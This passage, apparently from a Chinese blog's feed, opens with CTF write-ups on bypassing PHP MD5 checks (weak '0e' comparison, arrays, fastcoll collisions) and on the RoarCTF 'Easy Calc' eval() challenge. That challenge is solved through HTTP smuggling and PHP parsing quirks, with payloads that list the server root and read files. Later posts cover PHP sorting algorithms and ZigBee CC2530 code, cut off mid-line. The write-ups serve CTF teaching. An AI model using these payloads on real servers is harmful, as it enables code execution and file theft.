class="language-php">&lt;?phphighlight_file(__FILE__);error_reporting(0);$val1 &#x3D; @$_GET[&#39;val1&#39;];$val2 &#x3D; @$_GET[&#39;val2&#39;];$val3 &#x3D; @$_GET[&#39;val3&#39;];$val4 &#x3D; @$_GET[&#39;val4&#39;];$val5 &#x3D; (string)@$_POST[&#39;val5&#39;];$val6 &#x3D; (string)@$_POST[&#39;val6&#39;];$val7 &#x3D; (string)@$_POST[&#39;val7&#39;];if( $val1 &#x3D;&#x3D; $val2 )&#123;    die(&#39;val1 OR val2 no no no&#39;);&#125;if( md5($val1) !&#x3D; md5($val2) )&#123;    die(&#39;step 1 fail&#39;);&#125;if( $val3 &#x3D;&#x3D; $val4 )&#123;    die(&#39;val3 OR val4 no no no&#39;);&#125;if ( md5($val3) !&#x3D;&#x3D; md5($val4))&#123;    die(&#39;step 2 fail&#39;);&#125;if( $val5 &#x3D;&#x3D; $val6 || $val5 &#x3D;&#x3D; $val7 || $val6 &#x3D;&#x3D; $val7 )&#123;    die(&#39;val5 OR val6 OR val7 no no no&#39;);&#125;if (md5($val5) !&#x3D;&#x3D; md5($val6) || md5($val6) !&#x3D;&#x3D; md5($val7) || md5($val5) !&#x3D;&#x3D; md5($val7))&#123;    die(&#39;step 3 fail&#39;);&#125;if(!($_POST[&#39;a&#39;]) and !($_POST[&#39;b&#39;]))&#123;    echo &quot;come on!&quot;;    die();&#125;$a &#x3D; $_POST[&#39;a&#39;];$b &#x3D; $_POST[&#39;b&#39;];$m &#x3D; $_GET[&#39;m&#39;];$n &#x3D; $_GET[&#39;n&#39;];if (!(ctype_alnum($a)) || (strlen($a) &gt; 5)  || !(ctype_alnum($b)) || (strlen($b) &gt; 6))&#123;    echo &quot;a OR b fail!&quot;;    die();&#125;if ((strlen($m) &gt; 1) || (strlen($n) &gt; 1))&#123;    echo &quot;m OR n fail&quot;;    die();&#125;$val8 &#x3D; md5($a);$val9 &#x3D; strtr(md5($b), $m, $n);echo PHP_EOL;echo &quot;&lt;p&gt;val8 : $val8&lt;&#x2F;p&gt;&quot;;echo PHP_EOL;echo &quot;&lt;p&gt;val9 : $val9&lt;&#x2F;p&gt;&quot;;echo PHP_EOL;if (($val8 &#x3D;&#x3D; $val9) &amp;&amp; !($a &#x3D;&#x3D;&#x3D; $b) &amp;&amp; (strlen($b) &#x3D;&#x3D;&#x3D; 5))&#123;    echo &quot;nice,good job,give you flag:&quot;;    echo file_get_contents(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;);&#125;</code></pre><p>代码审计一个一个绕</p><p>第1、2个if：<code>val1</code>不能和<code>val2</code>一样，且<code>val1</code>和<code>val2</code>的MD5值需要相同，由于这里是用<code>!=</code>进行判断的，于是就可以用MD5弱比较进行绕过；这里给出两个可以绕过比较的字符串<code>s878926199a</code>和<code>s155964671a</code>、payload：<code>?val1=s878926199a&amp;val2=s155964671a</code>、随后进入下个if（当然这里也可以用数组绕过，下两个if解释）</p><blockquote><p>注：<code>s878926199a</code>的MD5值为<code>0e545993274517709034328855841020</code>，<code>s155964671a</code>的MD5值为<code>0e342768416822451524974117254469</code>函数在执行<code>!=</code>判断的时候会认为是以<code>0e</code>开头的科学计数法，所以两边都为0，即构成了弱比较绕过</p></blockquote><p>第3、4个if：<code>val3</code>不能和<code>val4</code>一样，且<code>val3</code>和<code>val4</code>的MD5值需要相同，而这里使用的是<code>!==</code>进行判断，这种判断会对MD5加密后的字符串进行严格的逐个字符判断，所以使用上面的方法是无效的，但是这里可以使用数组类型进行绕过，由于MD5函数无法处理数组，所以两边返回的都是<code>NULL</code>（上两个if也适用），就构成了绕过；payload：<code>?val1=s878926199a&amp;val2=s155964671a&amp;val3[]=1&amp;val4[]=2</code></p><p>第5、6个if：这里的函数需要让<code>val5</code>、<code>val6</code>、<code>val7</code>都不相等，且三个值的MD5值需要相同，并且使用的是<code>!==</code>进行判断，且在获取数值的时候进行了<code>string</code>类型转换，如果是数组的话会直接转换不成功，三个值没得到东西，第一个判断都过不了，这里就需要找到三个真正相等的MD5值的原型，这里就需要参考一篇文章：<a href="https://xz.aliyun.com/t/3161#toc-5">基于全等的MD5碰撞绕过</a>、如文章所述（cmd中执行）：</p><pre class="language-shell" data-language="shell"><code class="language-shell">fastcoll_v1.0.0.5.exe -o 0 1    -o参数代表随机生成两个相同MD5的文件fastcoll_v1.0.0.5.exe -p 1 -o 00 01    -p参数代表根据1文件随机生成两个相同MD5的文件，注意：生成的MD5与1不同tail.exe -c 128 00 &gt; a    -c 128代表将00的最后128位写入文件a，这128位正是1与00的MD5不同的原因tail.exe -c 128 01 &gt; b    同理type 0 a &gt; 10    这里表示将0和a文件的内容合并写入10type 0 b &gt; 11    这里表示将0和b文件的内容合并写入11</code></pre><p><a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">fastcoll下载链接</a>、<a href="https://www.trisunsoft.com/tail-for-windows.htm">tail.exe下载链接</a></p><p>这样就生成了4个MD5值相同的文件，查看四个文件的MD5值，是预期结果</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227120733977.png" alt loading="lazy"></p><p>于是在PHP中生成其中三个的urlencode的值：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php function  readmyfile($path)&#123;    $fh &#x3D; fopen($path, &quot;rb&quot;);    $data &#x3D; fread($fh, filesize($path));    fclose($fh);    return $data;&#125;echo &#39;二进制hash &#39;.md5((readmyfile(&quot;00&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;echo  &#39;URLENCODE &#39;.urlencode(readmyfile(&quot;00&quot;));echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;echo &#39;URLENCODE hash &#39;.md5(urlencode (readmyfile(&quot;00&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;echo &#39;二进制hash &#39;.md5((readmyfile(&quot;10&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;echo  &#39;URLENCODE &#39;.urlencode(readmyfile(&quot;10&quot;));echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;echo &#39;URLENCODE hash &#39;.md5(urlencode(readmyfile(&quot;10&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;echo &#39;二进制hash &#39;.md5((readmyfile(&quot;11&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;echo  &#39;URLENCODE &#39;.urlencode(readmyfile(&quot;11&quot;));echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;echo &#39;URLENCODE hash &#39;.md5( urlencode(readmyfile(&quot;11&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227121027756.png" alt loading="lazy"></p><pre class="language-HTML" data-language="HTML"><code class="language-HTML">二进制hash 4e7b1d0c72b69df7992d15f72f7c2056URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95hWq%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4%C9K%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6%C2l%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%9C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%93I%01%21%24%B9%D7%EDb%97Hk%21%5DX6%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%1B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%8B%05jh%FE%8A%BCc%9F%16%2A%A6%93%0A%AB%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%DE%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7D%C1o%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%3Cm%14%3C%81URLENCODE hash c09ff9138646c9e4ad9234d07ed6f935二进制hash 4e7b1d0c72b69df7992d15f72f7c2056URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95h%D7q%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4IK%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6Bl%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%1C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%13J%01%21%24%B9%D7%EDb%97Hk%21%5D%D86%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%1B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%8B%05jh%FE%8A%BCc%9F%16%2A%A6%93%0A%AB%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%DE%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7D%C1o%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%3Cm%14%3C%81URLENCODE hash 6b9eaae07963a665dcc4cabcad530507二进制hash 4e7b1d0c72b69df7992d15f72f7c2056URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95h%D7q%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4IK%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6Bl%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%1C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%13J%01%21%24%B9%D7%EDb%97Hk%21%5D%D86%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%9B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%0B%06jh%FE%8A%BCc%9F%16%2A%A6%93%0A%2B%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%5E%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7DAo%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%BCm%14%3C%81URLENCODE hash 559062db66b89ca9e98b3900fc75066e</code></pre><p>复制到burp中发包，可以看到成功绕过了if，进入下面的if</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227121221514.png" alt loading="lazy"></p><p>第7、8、9个if：POST两个值分别为<code>$a</code>和<code>$b</code>，<code>ctype_alnum()</code>表示函数内的值只能是字母个数字的组合，第7个if的意思我们的<code>$a</code>和<code>$b</code>需要满足<code>ctype_alnum()</code>函数，且长度不能大于五，第8个if的意思是get的参数<code>$m</code>和<code>$n</code>长度不能大于1，也就是只能为一个字符</p><p>后面的<code>$val8</code>为<code>$a</code>MD5加密后的值，<code>$val9</code>为<code>$b</code>结果MD5加密后，替换其中的<code>$m</code>值为<code>$n</code>的值</p><p>最后一个if：表示<code>$val8</code>和<code>$val9</code>的值都必须相等，注意这里是使用<code>==</code>进行判断，也就是说会认为<code>0e</code>开头的为科学计数法进行判断，<code>$a</code>和<code>$b</code>的值不能相等，且<code>$b</code>的长度必须为5</p><p>结果分析，有这种绕过方法：假设<code>$a</code>MD5加密后的值为<code>0e123421342...</code>、<code>$b</code>MD5加密后的值为<code>($m)e4657564745...</code>、就可以利用令<code>$n</code>=0来替换<code>$b</code>MD5加密后的第一位<code>$m</code>的值，从而构成绕过，这是我们只需要得到<strong>一个5位的MD5值开头<code>0e</code>后面跟的全是数字的MD5原型</strong>和<strong>一个5位的MD5值的第二位为e后面跟的全是数字的MD5原型</strong>，于是写脚本跑出这两个5位数：</p><pre class="language-python" data-language="python"><code class="language-python">import hashlibdef a():    str &#x3D; &quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890&quot;    for i in str:        for j in str:            for m in str:                for n in str:                    for k in str:                        payload &#x3D; (i+j+m+n+k).encode(&quot;utf-8&quot;)                        str1 &#x3D; hashlib.md5(payload)                        test1 &#x3D; str1.hexdigest()                        if test1[0:2] &#x3D;&#x3D; &quot;0e&quot; and test1[2:].isdigit():                            print(&quot;&#123;&#125;-&gt;&#123;&#125;&quot;.format(payload,test1))                            returndef b():    str &#x3D; &quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890&quot;    for i in str:        for j in str:            for m in str:                for n in str:                    for k in str:                        payload &#x3D; (i+j+m+n+k).encode(&quot;utf-8&quot;)                        str1 &#x3D; hashlib.md5(payload)                        test2 &#x3D; str1.hexdigest()                        if test2[1] &#x3D;&#x3D; &quot;e&quot; and test2[2:].isdigit():                            print(&quot;&#123;&#125;-&gt;&#123;&#125;&quot;.format(payload,test2))                            returnif __name__ &#x3D;&#x3D; &quot;__main__&quot;:    a()    b()</code></pre><p>得到的两个结果：</p><p><code>b&#39;byGcY&#39;-&gt;0e591948146966052067035298880982</code><br><code>b&#39;e2P2Z&#39;-&gt;3e297891816980937234055076451742</code></p><p>于是构造payload：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227130010106.png" alt loading="lazy"></p><p>发包得到flag</p><h1 id="HTTP走私"><a href="#HTTP走私" class="headerlink" title="HTTP走私"></a>HTTP走私</h1><h2 id="2019RoarCTF—Easy-Calc"><a href="#2019RoarCTF—Easy-Calc" class="headerlink" title="2019RoarCTF—Easy Calc"></a>2019RoarCTF—Easy Calc</h2><h3 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h3><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206123430992.png" alt loading="lazy"></p><p>查看源代码后发现存在<code>calc.php</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206123604958.png" alt loading="lazy"></p><p>访问得到后台源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);if(!isset($_GET[&#39;num&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;        $str &#x3D; $_GET[&#39;num&#39;];        $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];        foreach ($blacklist as $blackitem) &#123;                if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $str)) &#123;                        die(&quot;what are you want to do?&quot;);                &#125;        &#125;        eval(&#39;echo &#39;.$str.&#39;;&#39;);&#125;?&gt;</code></pre><p>过滤了大多数字符，尝试了提交一些字符会报<code>403</code>错误</p><blockquote><p>403错误是一种在网站访问过程中，常见的错误提示，表示资源不可用。服务器理解客户的请求，但拒绝处理它，通常由于服务器上文件或目录的权限设置导致的WEB访问错误。</p></blockquote><h3 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h3><p>参考文章：</p><ul><li><a href="https://xz.aliyun.com/t/6654#toc-1">从一道题到协议层攻击之HTTP请求走私</a></li><li><a href="https://blog.csdn.net/yankai0219/article/details/8269922">http协议中content-length 以及chunked编码分析</a></li><li><a href="https://www.freebuf.com/articles/web/213359.html">利用PHP的字符串解析特性Bypass</a></li></ul><h4 id="服务器http走私漏洞绕WAF"><a href="#服务器http走私漏洞绕WAF" class="headerlink" title="服务器http走私漏洞绕WAF"></a>服务器http走私漏洞绕WAF</h4><blockquote><p>前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。</p></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell">num&#x3D;var_dump(base_convert(61693386291,10,36)(chr(47)))</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144030983.png" alt loading="lazy"></p><pre class="language-shell" data-language="shell"><code class="language-shell">num&#x3D;var_dump(base_convert(2146934604002,10,36)(chr(47).base_convert(25254448,10,36)))</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144200310.png" alt loading="lazy"></p><h4 id="PHP字符串解析特性绕过WAF"><a href="#PHP字符串解析特性绕过WAF" class="headerlink" title="PHP字符串解析特性绕过WAF"></a>PHP字符串解析特性绕过WAF</h4><p>PHP需要将所有参数转换为有效的变量名，因此，在解析查询字符串时，它会做两件事：</p><blockquote><ul><li>删除初始空格</li><li>将某些字符转换为下划线（包括空格）</li></ul></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell">? num&#x3D;1;var_dump(scandir(chr(47)))</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144515082.png" alt loading="lazy"></p><pre class="language-shell" data-language="shell"><code class="language-shell">? num&#x3D;1;var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144617598.png" alt loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些排序和查找算法</title>
      <link href="/posts/3dae5dc2/"/>
      <url>/posts/3dae5dc2/</url>
      
        <content type="html"><![CDATA[<p>最近在看PHP的时候温习了一下原来学过的排序算法（忘的都差不多了-_-），故在此记录一下</p><a id="more"></a><h4 id="斐波拉契数列"><a href="#斐波拉契数列" class="headerlink" title="斐波拉契数列"></a>斐波拉契数列</h4><pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F;打印数列$arr &#x3D; array(1 &#x3D;&gt; 1,2 &#x3D;&gt; 1);echo &quot;&lt;pre&gt;&quot;;for ($i &#x3D; count($arr); $i &lt; 15; $i++)&#123;    $arr[$i + 1] &#x3D; $arr[$i] + $arr[$i - 1];&#125;print_r($arr);&#x2F;&#x2F;打印数列前15位&#x2F;&#x2F;下面计算数列的第几位function a($n)&#123;    if($n &#x3D;&#x3D;1 || $n &#x3D;&#x3D; 2) return 1;    return a($n - 1) + a($n -2);&#125;echo a(15);&#x2F;&#x2F;打印数列第15位</code></pre><h3 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h3><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><pre class="language-php" data-language="php"><code class="language-php">$arr &#x3D; array(5,7,3,9,1,6,2,8,4);$len &#x3D; count($arr);for ($i &#x3D; 0; $i &lt; $len; $i++)&#123;    for ($j &#x3D; 0; $j &lt; $len - $i -1;$j++)&#123;        if($arr[$j] &gt; $arr[$j+1])&#123;            $temp &#x3D; $arr[$j];            $arr[$j] &#x3D; $arr[$j+1];            $arr[$j+1] &#x3D; $temp;        &#125;    &#125;&#125;echo &quot;&lt;pre&gt;&quot;;print_r($arr);</code></pre><h4 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h4><pre class="language-php" data-language="php"><code class="language-php">$arr &#x3D; array(5,7,3,9,1,6,2,8,4);$len &#x3D; count($arr);for ($i &#x3D; 0;$i &lt;$len ;$i++)&#123;    $min &#x3D; $i;    for ($j &#x3D; $i + 1;$j &lt; $len;$j++)&#123; &#x2F;&#x2F;这个for循环选出最小值        if($arr[$j]&lt; $arr[$min])&#123;            $min &#x3D; $j;        &#125;    &#125;    if($min !&#x3D; $i)&#123;  &#x2F;&#x2F;选择最小值放前面        $temp &#x3D; $arr[$i];        $arr[$i] &#x3D; $arr[$min];        $arr[$min] &#x3D; $temp;    &#125;&#125;echo &quot;&lt;pre&gt;&quot;;print_r($arr);</code></pre><h4 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h4><pre class="language-php" data-language="php"><code class="language-php">$arr &#x3D; array(5,7,3,9,1,6,2,8,4);$len &#x3D; count($arr);for($i &#x3D; 1;$i &lt; $len;$i++)&#123;    $temp &#x3D; $arr[$i];    &#x2F;&#x2F;从第二个数据开始依次取出数据与前面已经排好的进行比较    $flag &#x3D; false;    for($j &#x3D; $i - 1; $j &gt;&#x3D; 0;$j--)&#123;        if($arr[$j] &gt; $temp)&#123;            $arr[$j + 1] &#x3D; $arr[$j];            &#x2F;&#x2F;$arr[$j] &#x3D; $temp;     &#x2F;&#x2F;优化后略过了这一次赋值，意思就是temp元素依旧存在，没进入数组，当前面的元素都交换完成后，才在后面的if语句中进行最后的赋值操作            $flag &#x3D; true;        &#125;else&#123;        break;   &#x2F;&#x2F;这里的作用是如果在判断的时候取出来的就已经比他左边的要大了，就不用进行交换了，直接break        &#125;    &#125;    if($flag)&#123;  &#x2F;&#x2F;如果交换了，则进行temp赋值        $arr[$j + 1] &#x3D; $temp; &#x2F;&#x2F;这里$j需要加一的原因是在上面的循环最后执行了一次$j--的操作，于是这里需要把1加上    &#125;&#125;echo &quot;&lt;pre&gt;&quot;;print_r($arr);</code></pre><h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><pre class="language-php" data-language="php"><code class="language-php">$arr &#x3D; array(5,7,3,9,1,6,2,8,4);function quick_sort($arr)&#123;    $len &#x3D; count($arr);    if($len &lt;&#x3D; 1) return $arr;    $left &#x3D; $right &#x3D; array();    for($i &#x3D; 1;$i &lt; $len;$i++)&#123;        if($arr[0] &gt; $arr[$i])&#123;            $left[] &#x3D; $arr[$i];        &#125;else&#123;            $right[] &#x3D; $arr[$i];        &#125;    &#125;    $left &#x3D; quick_sort($left);&#x2F;&#x2F;递归    $right &#x3D; quick_sort($right);&#x2F;&#x2F;递归    return array_merge($left,(array)$arr[0],$right);&#x2F;&#x2F;合并数组，注意这里元素必须全是数组才能进行操作，$arr[0]为元素，所以需要强制转换成数组，或者用array($arr[0])也可以&#125;echo &quot;&lt;pre&gt;&quot;;print_r(quick_sort($arr));</code></pre><h4 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h4><pre class="language-php" data-language="php"><code class="language-php">$arr &#x3D; array(5,7,3,9,1,6,2,8,4);function merge_sort($arr)&#123;    $len &#x3D; count($arr);    if($len &lt;&#x3D; 1) return $arr;    $a  &#x3D; floor($len &#x2F; 2);&#x2F;&#x2F;舍去法取整    $left &#x3D; array_slice($arr,0,$a);&#x2F;&#x2F;array_slice从数组中取出一段序列    $right &#x3D; array_slice($arr,$a);    $left &#x3D; merge_sort($left);&#x2F;&#x2F;递归    $right &#x3D; merge_sort($right);&#x2F;&#x2F;递归    $m &#x3D; array();    while(count($left) &amp;&amp; count($right)) &#123;&#x2F;&#x2F;当有一边为0则结束返回        $m[] &#x3D; $left[0] &lt; $right[0] ? array_shift($left) : array_shift($right);    &#125;    return array_merge($m,$left,$right);&#x2F;&#x2F;后两个数组的放置对结果没影响&#125;echo &quot;&lt;pre&gt;&quot;;print_r(merge_sort($arr));</code></pre><h3 id="查找算法"><a href="#查找算法" class="headerlink" title="查找算法"></a>查找算法</h3><p>这里有一种数组遍历查找就没写了</p><h4 id="二分法查找"><a href="#二分法查找" class="headerlink" title="二分法查找"></a>二分法查找</h4><p>注：二分法查找前要求数列是已经排好序了的</p><pre class="language-php" data-language="php"><code class="language-php">$arr &#x3D; array(1,2,3,4,5,6,7,8,9);function check($arr,$num)&#123;    $left &#x3D; 0;    $right &#x3D; count($arr);    while($left &lt;&#x3D; $right)&#123;        $middle &#x3D; floor(($left + $right) &#x2F; 2);        if($arr[$middle] &#x3D;&#x3D; $num)&#123;            return $arr[$middle];        &#125;        if($arr[$middle] &gt; $num)&#123;            $right &#x3D; $middle - 1;        &#125;else&#123;            $left &#x3D; $middle + 1;        &#125;    &#125;    return false;&#125;print_r(check($arr,11));</code></pre><p>这个方法在查找的时候如果要查的数据不在数组里就会报下面的注意事项（在的话不会报错），返回的结果<code>false</code>还是有的</p><pre class="language-none"><code class="language-none">Notice:  Undefined offset: 9 in C:\xxx\test.php on line 7Notice:  Undefined offset: 9 in C:\xxx\test.php on line 10</code></pre><p>原因还没找到，如果有大佬知道的话欢迎留言指出，wtcl -_-，没有的话坑先留着后面再填</p><h4 id="二分归并法查找"><a href="#二分归并法查找" class="headerlink" title="二分归并法查找"></a>二分归并法查找</h4><pre class="language-php" data-language="php"><code class="language-php">$arr &#x3D; array(1,2,3,4,5,6,7,8,9);function check($arr,$num)&#123;    $len &#x3D; count($arr);    $a &#x3D; floor($len &#x2F; 2);    $left &#x3D; array_slice($arr,0,$a);    $right &#x3D; array_slice($arr,$a);    while(count($left) &amp;&amp; count($right))&#123;        if($arr[$a] &#x3D;&#x3D;&#x3D; $num )&#123;            return $arr[$a];        &#125;else if($arr[$a] &gt; $num)&#123;            return check($left,$num);        &#125;else&#123;            return check($right,$num);        &#125;    &#125;    return false;&#125;print_r(check($arr,8));</code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZigBee无线通信数据传输</title>
      <link href="/posts/ff0d7e8b/"/>
      <url>/posts/ff0d7e8b/</url>
      
        <content type="html"><![CDATA[<ol><li><p>Zigbee无线通信，需要高频的载波来提供发射效率，Zigbee模块之间要可以正常的收发，接收模块必须把接收频率设置和发射模块的载波频率一致。</p></li><li><p>Zigbee有27个载波可以进行通信，载波叫做信道（无线通信的通道）。这些载波的频率落在某些频率区段，我们把这些区段叫做频段。TI的所有支持Zigbee底层协议的芯片只能在2.4G频段的16个信道里进行通信。即：</p><blockquote><p>11  2405M</p><p>12  2410M</p><p>……</p><p>26  2480M</p></blockquote></li><li><p>在Zigbee无线局域网里，每一模块都一个在该网络里唯一的2个字节的地址，这个地址叫做网络地址，网络短地址。</p></li></ol><a id="more"></a><ol start="4"><li><p>PANID这是一个2个字节的编码，用来区别不同的Zigbee无线局域网，个域网ID.</p></li><li><p>无线数据包的内容</p><blockquote><p>#define SENDVAL 5<br>char SendPacket[]={0x0C,0x61,0x88,0x00,0x07,0x20,0xEF,0xBE,0x20,0x50,SENDVAL};<br>//第一个字节0x0C含义，这个自己后面还有12个字节要发送<br>//第5 6个字节表示的是PANID<br>//第7 8个字节是无线模块目标设备的网络地址 0xBEEF<br>//第9 10就是本地模块的网络地址<br>//11 个字节是我们有用的数据<br>// CRC码 12 13个字节 是硬件自动追加</p></blockquote></li></ol><p>实验代码：</p><p>按钮控制数码管的数字显示变化</p><p>发送：</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;ioCC2530.h&gt;#include&quot;74LS164_8LED.h&quot;#define SENDVAL 5char SendPacket[]&#x3D;&#123;0x0c,0x61,0x88,0x00,0x07,0x20,0xEF,0xBE,0x20,0x50,SENDVAL&#125;;&#x2F;&#x2F;第一个字节0x0C含义，这个自己后面还有12个字节要发送&#x2F;&#x2F;第5 6个字节表示的是PANID&#x2F;&#x2F;第7 8个字节是无线模块目标设备的网络地址 0xBEEF&#x2F;&#x2F;第9 10就是本地模块的网络地址&#x2F;&#x2F;11 个字节是我们有用的数据&#x2F;&#x2F; CRC码 12 13个字节 是硬件自动追加void Delay()  &#x2F;&#x2F;延时函数&#123;    int y,x;    for(y&#x3D;1000;y&gt;0;y--)      for(x&#x3D;30;x&gt;0;x--);&#125;void Init32M()  &#x2F;&#x2F;设置为32M晶振&#123;   SLEEPCMD &amp;&#x3D;0xFB;&#x2F;&#x2F;1111 1011 开启2个高频时钟源   while(0&#x3D;&#x3D;(SLEEPSTA &amp; 0x40));&#x2F;&#x2F; 0100 0000 等待32M稳定   Delay();   CLKCONCMD &amp;&#x3D;0xF8;&#x2F;&#x2F;1111 1000 不分频输出   CLKCONCMD &amp;&#x3D;0XBF;&#x2F;&#x2F;1011 1111 设置32M作为系统主时钟   while(CLKCONSTA &amp; 0x40); &#x2F;&#x2F;0100 0000 等待32M成功成为当前系统主时钟&#125;void KeysIntCfg()  &#x2F;&#x2F;设置开关中断&#123;&#x2F;&#x2F;Key3  Key4   Key5     IEN2|&#x3D;0x10;&#x2F;&#x2F;开P1IE组中断     P1IEN|&#x3D;0x02;&#x2F;&#x2F;开Key3组内中断     PICTL|&#x3D;0x02;&#x2F;&#x2F;设置P1_1为下降沿      EA&#x3D;1;      &#x2F;&#x2F;开总中断&#125;void halRfInit(void)&#x2F;&#x2F;无线通信的初始化  初始化相关的寄存器，配置工作信道，和PANID&#123;    EA&#x3D;0;    FRMCTRL0 |&#x3D; 0x60;    &#x2F;&#x2F; Recommended RX settings      TXFILTCFG &#x3D; 0x09;    AGCCTRL1 &#x3D; 0x15;    FSCAL1 &#x3D; 0x00;    &#x2F;&#x2F; enable RXPKTDONE interrupt      RFIRQM0 |&#x3D; 0x40;&#x2F;&#x2F;把射频接收中断打开    &#x2F;&#x2F; enable general RF interrupts    IEN2 |&#x3D; 0x01;    FREQCTRL 